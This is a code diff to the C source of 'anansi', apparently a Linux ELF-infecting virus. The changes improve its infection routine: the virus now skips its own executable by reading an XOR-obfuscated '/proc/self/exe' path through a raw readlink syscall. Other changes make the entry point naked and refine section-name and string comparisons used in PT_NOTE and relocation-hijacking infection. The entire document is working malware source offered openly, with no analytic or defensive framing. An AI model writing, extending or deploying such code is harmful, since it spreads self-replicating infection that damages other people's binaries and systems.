@@ -71,6 +71,7 @@ typedef struct elfbin {
 extern unsigned long real_start;
 
 // functions unique to anansi
+char *get_self_path();
 int dispatch_infection(Elfbin *target);
 void append_ret_2_OEP_stub(uint8_t *insertion, Elfbin *target, uint64_t orig_entry);
 bool is_already_infected(Elfbin *target);
@@ -111,6 +112,7 @@ long anansi_read(int fd, void *buf, size_t count);
 void *anansi_mmap(void *addr, size_t len, int prot, int flags, int fildes, off_t off);
 long anansi_stat(const char *path, struct stat *statbuf);
 long anansi_munmap(void *addr, size_t len);
+long anansi_readlink(const char *path, char *buf, size_t bufsiz);
 long anansi_open(const char *pathname, int flags, int mode);
 long anansi_getdents64(int fd, void *dirp, size_t count);
 long anansi_getcwd(char *buf, size_t size);
@@ -133,7 +135,7 @@ struct linux_dirent {
 	char           d_name[NAME_MAX +1];  /* Filename (null-terminated) */
 };
 
-void _start() {
+void __attribute__((naked)) _start() {
 	__asm__ volatile (
 			".globl real_start\n"
 			"real_start:\n"
@@ -179,6 +181,7 @@ void vx_main()
 	char *cwd = NULL;
 	char *cwd_listings = NULL;
 	char *full_path = NULL;
+	char *self_path = NULL;
 
 	struct linux_dirent *d;
 	long nread;
@@ -217,6 +220,7 @@ void vx_main()
 	target.vx_size = vx_size;
 	target.vx_start = vx_start;
 	print_banner_test();
+	self_path = get_self_path();
 
 	for(long entry = 0; entry < nread; entry += d->d_reclen) {
 		d = (struct linux_dirent *) (cwd_listings + entry);
@@ -228,6 +232,10 @@ void vx_main()
 
 		if(!(full_path = create_full_path(cwd, d->d_name)))
 			continue;
+
+		if(self_path)
+			if(!anansi_strncmp(self_path, full_path, anansi_strlen(self_path)))
+				continue;
 
 		process_elf_initialize(&target, full_path);
 		write_vx_meta_data(&target, vx_start, vx_size);
@@ -254,8 +262,26 @@ clean_up:
 		anansi_munmap(cwd, PATH_MAX);
 	if(cwd_listings != NULL)
 		anansi_munmap(cwd_listings, DIR_LISTING_SIZE);
+	if(self_path != NULL)
+		anansi_munmap(self_path, anansi_strlen(self_path));
 }
 
+
+char *get_self_path()
+{
+	size_t path_len;
+	char encrypted_proc_slash_self_exe[] = ".qsnb.rdmg.dyd";
+	char *proc_slash_self_exe = anansi_malloc(anansi_strlen(encrypted_proc_slash_self_exe));
+	char *self_path_buf = anansi_malloc(PATH_MAX);
+
+	if(self_path_buf) {
+		decrypt_xor(encrypted_proc_slash_self_exe, proc_slash_self_exe);
+		path_len = anansi_readlink(proc_slash_self_exe, self_path_buf, PATH_MAX);
+		self_path_buf[path_len] = '\0';
+	}
+
+	return self_path_buf;
+}
 
 int dispatch_infection(Elfbin *target)
 {
@@ -400,7 +426,7 @@ void pt_note_infect(Elfbin *target)
  * Checks to see if relocation poisoning/hijacking is viable, we are targeting R_X86_64_RELATIVE relocation type.
  * libc and ld-linux shared objects should not contain this type.
  */
-
+//TODO: Identify libraries
 bool has_R_X86_64_RELATIVE(Elfbin *target, Elf64_Rela *desired_reloc)
 {
 	int p_entry;
@@ -479,8 +505,15 @@ bool within_section(Elfbin *target, char *section, uint64_t addr)
 	Elf64_Shdr *strtab_section = &target->shdr[s_index];
 	uint8_t *strtab = (uint8_t *)(target->read_only_mem + strtab_section->sh_offset);
 
+	size_t section_len = anansi_strlen(section);
+
 	for(int i = 0; i < target->ehdr->e_shnum; i++) {
-		if(!anansi_strncmp((const char *)&strtab[target->shdr[i].sh_name], section, anansi_strlen(section))) {
+		unsigned char *indexed_section = (unsigned char *)(&strtab[target->shdr[i].sh_name]);
+		size_t indexed_section_len = anansi_strlen(indexed_section);
+		if((*indexed_section == '\0') || (section_len != indexed_section_len)) //handling edge-cases
+			continue;
+
+		if(!anansi_strncmp((const char *)indexed_section, section, indexed_section_len)) {
 			start_addr = target->shdr[i].sh_addr;
 			end_addr = target->shdr[i].sh_addr + target->shdr[i].sh_size;
 			return (addr >= start_addr) && (addr <= end_addr);
@@ -1137,10 +1170,13 @@ void *anansi_memcpy(void *dest, void *src, size_t n)
 
 int anansi_strncmp(const char *s1, const char *s2, size_t n)
 {
-	while(n--)
-		if(*s1++ != *s2++) return -1;
-
-	return 0;
+	int diff = 0;
+	for(size_t i = 0; i < n; i++) {
+		diff = (unsigned char)(*s1++) - (unsigned char)(*s2++);
+		if(diff != 0 || *s1 == '\0')
+			break;
+	}
+	return diff;
 }
 
 #define __load_syscall_ret(var) __asm__ __volatile__ ("mov %%rax, %0" : "=r" (var));
@@ -1242,6 +1278,23 @@ int anansi_strncmp(const char *s1, const char *s2, size_t n)
                 return ret; \
         }
 
+#define __readlink_syscall(type, name, arg1, arg1_type, arg2, arg2_type, arg3, arg3_type) \
+		type name(arg1_type arg1, arg2_type arg2, arg3_type arg3) { \
+                type ret; \
+                __asm__ __volatile__( \
+                "movq $89, %%rax\n" \
+                "movq %0, %%rdi\n" \
+                "movq %1, %%rsi\n" \
+                "movq %2, %%rdx\n" \
+                "syscall" \
+                : \
+                : "g" (arg1), "g" (arg2), "g" (arg3) \
+                : "%rax", "%rdi", "%rsi", "%rdx" \
+        ); \
+        __load_syscall_ret(ret); \
+        return ret; \
+        }
+
 #define __open_syscall(type, name, arg1, arg1_type, arg2, arg2_type, arg3, arg3_type) \
         type name(arg1_type arg1, arg2_type arg2, arg3_type arg3) { \
                 type ret; \
@@ -1311,6 +1364,7 @@ __exit_syscall(int, anansi_exit, status, int);
 __write_syscall(long, anansi_write, fd, int, buf, const void *, count, size_t);
 __read_syscall(long, anansi_read, fd, int, buf, void *, count, size_t);
 __mmap_syscall(void *, anansi_mmap, addr, void *, len, size_t, prot, int, flags, int, fildes, int, off, off_t);
+__readlink_syscall(long, anansi_readlink, pathname, const char *restrict, buf, char *restrict, bufsiz, size_t);
 __stat_syscall(long, anansi_stat, path, const char *, statbuf, struct stat *);
 __munmap_syscall(long, anansi_munmap, addr, void *, len, size_t);
 __open_syscall(long, anansi_open, pathname, const char *, flags, int, mode, int);
